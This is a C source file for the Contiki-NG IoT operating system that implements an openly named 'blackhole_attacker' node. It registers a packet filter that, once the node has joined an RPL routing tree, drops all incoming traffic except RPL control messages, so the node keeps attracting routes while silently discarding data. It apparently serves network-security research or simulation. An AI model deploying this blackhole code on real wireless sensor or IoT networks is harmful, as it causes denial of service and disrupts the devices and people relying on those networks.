#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(blackhole_attacker, "RPL UDP Blackhole");
AUTOSTART_PROCESSES(&blackhole_attacker);

/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  uip_ipaddr_t root_ipaddr;
  uint8_t proto = 0;
  uint8_t icmp6_type = 0;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if (proto == UIP_PROTO_ICMP6) {
    switch (UIP_IP_BUF->proto) {
      case UIP_PROTO_ICMP6:
        icmp6_type = uip_buf[UIP_IPH_LEN];
        break;
      case UIP_PROTO_HBHO:
        icmp6_type = uip_buf[UIP_IPH_LEN + 8];
        break;
      case UIP_PROTO_ROUTING:
        icmp6_type = uip_buf[UIP_IPH_LEN + 16];
        break;
      default:
        break;
    }
    LOG_INFO("Incoming packet proto: %d, ICMP6 type: %d\n", proto, icmp6_type);
  }
  else {
    LOG_INFO("Incoming packet proto: %d\n", proto);
  }
  if(NETSTACK_ROUTING.node_is_reachable()
       && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr))
  {
    if (proto != UIP_PROTO_ICMP6 || icmp6_type != ICMP6_RPL) {
      LOG_INFO("Dropping packet !\n");
      return NETSTACK_IP_DROP;
    }
  }
  LOG_INFO("Processing packet !\n");
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};
/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(blackhole_attacker, ev, data)
{
  PROCESS_BEGIN();

  netstack_ip_packet_processor_add(&packet_processor);

  while (1) {
    PROCESS_YIELD();
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
